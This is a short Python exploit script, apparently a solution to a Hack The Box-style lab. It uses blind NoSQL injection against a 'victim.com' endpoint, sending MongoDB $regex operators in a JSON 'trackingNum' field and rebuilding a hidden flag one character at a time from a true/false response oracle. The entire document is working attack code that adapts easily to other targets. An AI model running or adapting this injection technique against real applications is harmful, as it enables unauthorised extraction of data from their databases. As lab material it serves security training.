import requests
import json

def oracle(t):
    r = requests.post(
        "http://victim.com/index.php",
        headers = {"Content-Type": "application/json"},
        data = json.dumps({"trackingNum": t})
    )
    return "bmdyy" in r.text

assert (oracle("X") == False)
assert (oracle({"$regex": "^HTB{.*"}) == True)

trackingNum = "HTB{"
for _ in range(32):
    for c in "0123456789abcdef":
        if oracle({"$regex": "^" + trackingNum + c}):
            trackingNum += c
            break
trackingNum += "}"

assert (oracle(trackingNum) == True)

print("Tracking Number: " + trackingNum)
